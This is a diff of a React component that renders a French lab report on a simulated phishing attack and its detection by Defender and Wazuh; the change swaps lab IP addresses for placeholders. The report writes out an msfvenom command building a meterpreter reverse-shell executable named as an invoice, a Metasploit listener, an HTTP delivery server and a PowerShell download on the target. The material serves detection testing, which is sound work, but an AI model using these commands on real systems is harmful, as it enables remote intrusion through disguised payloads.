@@ -6,7 +6,7 @@ export default function RapportPhishing() {
       <ReportHeader
         title="Phishing msfvenom — Chaîne complète"
         subtitle="Méthode 1 · MITRE T1566 (Phishing) · Détection Defender + Wazuh"
-        meta="28 juin 2026 · Kali 192.168.56.100 → Windows Server 2022 192.168.56.101 · Wazuh 4.12.0"
+        meta="28 juin 2026 · Kali [KALI] → Windows Server 2022 [SERVEUR] · Wazuh 4.12.0"
       />
 
       <H2>1. Objectif</H2>
@@ -19,17 +19,17 @@ export default function RapportPhishing() {
 
       <H2>2. Déroulement de l'attaque</H2>
       <H3>Étape 1 — Création du payload</H3>
-      <Cmd term="Kali — Terminal 1">{`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.100 LPORT=4444 \\
+      <Cmd term="Kali — Terminal 1">{`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[KALI] LPORT=4444 \\
   -f exe -o /home/kali/facture_2026.exe`}</Cmd>
       <p>Le nom « facture_2026.exe » simule une pièce jointe de phishing crédible.</p>
       <H3>Étape 2 — Listener Metasploit en attente</H3>
       <Cmd term="Kali — Terminal 2">{`msfconsole -q -x "use exploit/multi/handler;
   set PAYLOAD windows/x64/meterpreter/reverse_tcp;
-  set LHOST 192.168.56.100; set LPORT 4444; run"`}</Cmd>
+  set LHOST [KALI]; set LPORT 4444; run"`}</Cmd>
       <H3>Étape 3 — Serveur HTTP de livraison</H3>
       <Cmd term="Kali — Terminal 3">cd /home/kali && python3 -m http.server 9999</Cmd>
       <H3>Étape 4 — Téléchargement sur la cible (simule le clic victime)</H3>
-      <Cmd term="Windows Server — PowerShell Admin">{`Invoke-WebRequest -Uri http://192.168.56.100:9999/facture_2026.exe \`
+      <Cmd term="Windows Server — PowerShell Admin">{`Invoke-WebRequest -Uri http://[KALI]:9999/facture_2026.exe \`
   -OutFile C:\\Windows\\Temp\\facture_2026.exe`}</Cmd>
       <p>
         <b>Résultat immédiat :</b> Defender intercepte l'écriture sur disque et bloque le fichier avant même
